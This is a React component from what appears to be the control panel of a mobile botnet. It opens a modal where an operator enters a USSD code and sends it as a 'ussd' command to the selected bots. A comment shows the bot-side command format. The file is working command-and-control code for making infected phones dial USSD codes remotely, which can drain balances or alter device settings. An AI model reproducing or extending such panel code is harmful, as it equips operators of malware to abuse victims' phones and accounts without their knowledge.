import React from 'react';
import SettingsContext from '../../Settings';
import { try_eval } from '../../serviceF';

//USSD - {"this":"~command~","name":"startUssd","ussd":"*100#"}
class SendUSSD extends React.Component {

    constructor(props) {
        super(props);
        this.state = {
          ussd: ''
        }
    }

    onChangeUSSD = (e) => {
        this.setState({ 
            ussd: e.target.value.substring(0,40)
        });
    }

    onClickSendUSSD = (e) => {
        if(SettingsContext.BotsSelected()) {
            SettingsContext.BotSendCommand('{"cmd":"ussd","u":"' + this.state.ussd + '"}');
         //   SettingsContext.ShowToastTitle("info", "USSD", "Please wait while the bots confirm the ussd " + this.state.ussd);
            try_eval('$.notify("Added command [ussd]", "info");');
            this.setState({ 
                ussd: ''
            });
        }
    }

    render () {
        return (
            <React.Fragment>
             

             <div class="modal fade" id="modalUSSD" tabindex="-1" role="dialog" aria-labelledby="modalUSSD" aria-hidden="true">
                    <div class="modal-dialog" role="document">
                        <div class="modal-content">
                            <div class="modalClose">
                                <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                                    <span aria-hidden="true">&times;</span>
                                </button>
                            </div>  

                            <h5 class="modalTitle">Run USSD request</h5>

                            <div class="modal-body">
                                 <input class="form-control" value={this.state.ussd} onChange={this.onChangeUSSD} placeholder="*111#" />
                            </div>
                            <div class = "modalFooter">
                                <button type="button" onClick={this.onClickSendUSSD} class="btn btn-outline-primary"  data-dismiss="modal">Run USSD request</button>
                            </div>
                        </div>
                    </div>
                </div>



            </React.Fragment>
        );
    }
}

export default SendUSSD;